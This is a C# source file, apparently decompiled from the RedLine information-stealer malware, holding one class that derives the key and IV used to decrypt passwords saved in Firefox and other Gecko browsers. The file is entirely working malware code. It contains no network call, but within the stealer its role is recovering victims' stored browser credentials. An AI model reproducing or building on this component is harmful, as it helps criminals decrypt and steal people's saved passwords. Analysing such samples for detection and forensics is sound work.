using System;
using System.Security.Cryptography;

namespace RedLine.Logic.Browsers.Gecko
{
  public class GeckoPasswordBasedEncryption
  {
    private byte[] _globalSalt { get; }

    private byte[] _masterPassword { get; }

    private byte[] _entrySalt { get; }

    public byte[] DataKey { get; private set; }

    public byte[] DataIV { get; private set; }

    public GeckoPasswordBasedEncryption(byte[] salt, byte[] password, byte[] entry)
    {
      this._globalSalt = salt;
      this._masterPassword = password;
      this._entrySalt = entry;
    }

    public void Init()
    {
      SHA1CryptoServiceProvider cryptoServiceProvider = new SHA1CryptoServiceProvider();
      byte[] buffer1 = new byte[this._globalSalt.Length + this._masterPassword.Length];
      Array.Copy((Array) this._globalSalt, 0, (Array) buffer1, 0, this._globalSalt.Length);
      Array.Copy((Array) this._masterPassword, 0, (Array) buffer1, this._globalSalt.Length, this._masterPassword.Length);
      byte[] hash1 = cryptoServiceProvider.ComputeHash(buffer1);
      byte[] buffer2 = new byte[hash1.Length + this._entrySalt.Length];
      Array.Copy((Array) hash1, 0, (Array) buffer2, 0, hash1.Length);
      Array.Copy((Array) this._entrySalt, 0, (Array) buffer2, hash1.Length, this._entrySalt.Length);
      byte[] hash2 = cryptoServiceProvider.ComputeHash(buffer2);
      byte[] buffer3 = new byte[20];
      Array.Copy((Array) this._entrySalt, 0, (Array) buffer3, 0, this._entrySalt.Length);
      for (int length = this._entrySalt.Length; length < 20; ++length)
        buffer3[length] = (byte) 0;
      byte[] buffer4 = new byte[buffer3.Length + this._entrySalt.Length];
      Array.Copy((Array) buffer3, 0, (Array) buffer4, 0, buffer3.Length);
      Array.Copy((Array) this._entrySalt, 0, (Array) buffer4, buffer3.Length, this._entrySalt.Length);
      byte[] hash3;
      byte[] hash4;
      using (HMACSHA1 hmacshA1 = new HMACSHA1(hash2))
      {
        hash3 = hmacshA1.ComputeHash(buffer4);
        byte[] hash5 = hmacshA1.ComputeHash(buffer3);
        byte[] buffer5 = new byte[hash5.Length + this._entrySalt.Length];
        Array.Copy((Array) hash5, 0, (Array) buffer5, 0, hash5.Length);
        Array.Copy((Array) this._entrySalt, 0, (Array) buffer5, hash5.Length, this._entrySalt.Length);
        hash4 = hmacshA1.ComputeHash(buffer5);
      }
      byte[] numArray = new byte[hash3.Length + hash4.Length];
      Array.Copy((Array) hash3, 0, (Array) numArray, 0, hash3.Length);
      Array.Copy((Array) hash4, 0, (Array) numArray, hash3.Length, hash4.Length);
      this.DataKey = new byte[24];
      for (int index = 0; index < this.DataKey.Length; ++index)
        this.DataKey[index] = numArray[index];
      this.DataIV = new byte[8];
      int index1 = this.DataIV.Length - 1;
      for (int index2 = numArray.Length - 1; index2 >= numArray.Length - this.DataIV.Length; --index2)
      {
        this.DataIV[index1] = numArray[index2];
        --index1;
      }
    }
  }
}
